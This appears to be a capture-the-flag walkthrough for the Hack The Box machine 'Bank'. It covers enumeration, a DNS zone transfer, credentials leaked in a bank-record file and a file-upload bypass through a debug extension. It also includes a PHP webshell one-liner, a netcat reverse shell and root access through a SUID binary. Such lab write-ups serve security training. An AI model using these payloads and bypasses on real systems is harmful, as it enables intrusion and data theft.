# Bank - Easy

```sh
sudo vim /etc/hosts
# add bank.htb

nmap -T4 -p- -A -Pn -v bank.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
    * 53/tcp - domain - ISC BIND 9.9.5-3ubuntu0.14
    * 80/tcp - http - Apache httpd 2.4.7

* the webpage leads to a login page at /login.php for 'HTB Bank' - the login form has fields for email address & password, and the button mentions 'Submit Query' instead of the expected 'Login'; this could be hinting towards SQLi

* trying common creds like 'admin:admin' or 'admin@bank.htb:admin' fails, and we get the error "Your credentials are not matching our records"

* checking DNS enumeration:

    ```sh
    dig bank.htb

    dig A bank.htb
    # query 'A' records

    dig axfr @10.129.29.200 bank.htb
    # check zone transfer with domain
    ```

* using the zone transfer command, we get additional domains 'chris.bank.htb', 'ns.bank.htb' & 'www.bank.htb' - we can add this to ```/etc/hosts```

* if we navigate to 'http://chris.bank.htb', we get the Apache default landing page

* web enumeration:

    ```sh
    gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 25
    # dir scan

    ffuf -c -u 'http://bank.htb' -H 'Host: FUZZ.bank.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 3526 -s
    # subdomain scan

    gobuster dir -u http://chris.bank.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,sh,md,db -t 25
    # dir scan for the other subdomain
    ```

* ```gobuster``` finds some pages for the 'bank.htb' domain:

    * /index.php - this redirects to /login.php
    * /assets - this includes files for the webpage, but no useful info found
    * /support.php - this redirects to /login.php
    * /uploads - 403 Forbidden
    * /inc - this includes a few PHP files, but we cannot access it
    * /balance-transfer - this includes several '.acc' files

* checking the '/balance-transfer' folder, it includes a lot of '.acc' files

* reviewing one of the '.acc' files, it seems to be a record of a bank account with encrypted data - the header includes the text 'ENCRYPT SUCCESS' - and data like full name, email, password and balance is mentioned for the account, but it is encrypted

* trying to crack it using Cyberchef does not work, so we can check next if all '.acc' files in this folder are having the same encrypted format:

    ```sh
    wget --no-parent --no-directories -r http://bank.htb/balance-transfer/
    # download all files from the '/balance-transfer' directory

    grep -L "SUCCESS" *
    # find files which do not contain "SUCCESS" string
    # -L for finding files without match

    # this finds one file

    less 68576f20e9732f1b2edc4df5b8533230.acc
    ```

* using ```grep``` to search for any files which do not contain the 'ENCRYPT SUCCESS' message, we get a hit for file '68576f20e9732f1b2edc4df5b8533230.acc'

* from this file, we get the creds 'chris@bank.htb:!##HTBB4nkP4ssw0rd!##'

* we can try cred re-use in SSH but this does not work, so we can log into the website to check further

* after logging in, we get access to the dashboard page '/index.php' - which contains the account info

* we also have a support page '/support.php' - which has a view of our tickets, and an input form to create a ticket with file upload

* if we try to create a test ticket and upload a PHP reverse shell file, we get an error saying that we can upload only images

* we can intercept a valid request in Burp Suite and test this for any bypasses

* on intercepting, we can see that the website performs a POST request to '/support.php' with the image upload included

* after creating a ticket, we can see the attachment leads to the '/uploads' directory without a change in filename, and we can also delete the ticket - this refers to the link '/delete-ticket.php?id=1'

* we can try some file upload bypass techniques now:

    * trying to modify the 'Content-Type' header from 'application/x-php' to 'image/jpeg' when uploading the PHP revshell fails

    * testing the file extension method shows that 'filename.jpg.php' fails, but 'filename.php.jpg' is accepted as a valid file - the website is checking the extension as well

    * we can try uploading an actual image file, intercepting the request, and modifying the filename to 'shell.php', and adding the webshell code at end of image file like ```<?php system($_REQUEST['cmd']); ?>``` - but this also gets detected

* checking the source code for '/support.php' includes a comment which shows a critical detail - the developer has added the file extension '.htb' to be executed as PHP for debugging purposes

* so we can upload a prepared PHP reverse shell file named like 'shell.htb', submit the ticket - and this uploads the 'shell.htb' file in the '/uploads' directory

* if we setup a listener using ```nc -nvlp 4444```, and navigate to the attachment at 'http://bank.htb/uploads/shell.htb', we get the reverse shell

* in reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    ls -la /
    # we have a non-default directory '.rpmdb' here

    ls -la /home
    # user 'chris'

    ls -la /home/chris

    cat /home/chris/user.txt
    # user flag

    ls -la /var/www
    # enumerate webroot files

    ls -la /var/www/bank
    # check all files

    cat /var/www/bank/bankreports.txt
    # creds for 'chris' - we already have this

    cat /var/www/bank/inc/*
    # check all PHP files
    ```

* from the PHP files in the webroot folder, we get the creds 'root:!@#S3cur3P4ssw0rd!@#' for MySQL DB

* we can check if the MySQL DB creds work:

    ```sh
    mysql -u root -p -e 'show databases'
    # this works
    # check the non-default DB 'htbbank'

    mysql -u root -p -D htbbank -e 'show tables'
    # we have 3 tables - creditcards, tickets and users

    mysql -u root -p -D htbbank -e 'select * from users'
    # this shows hashes for 'chris' only
    ```

* as the MySQL DB seems to have no usable info, we can continue enumerating the system:

    ```sh
    ls -la /
    # enumerate the system

    ls -la /var
    # there is a non-default folder 'htb'

    ls -la /var/htb
    # has a folder 'bin' and a file 'emergency'

    cat /var/htb/emergency

    ls -la /var/htb/bin
    # includes a file

    file /var/htb/bin/emergency
    # SUID binary
    ```

* the non-default folder ```/var/htb``` has a file 'emergency' - this is a Python script that runs the SUID-bit binary ```/var/htb/bin/emergency``` to give a root shell for emergency

* we can test if this works:

    ```sh
    python2 /var/htb/emergency
    # the script is for Python2 code and not Python3

    # enter 'y' to get root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
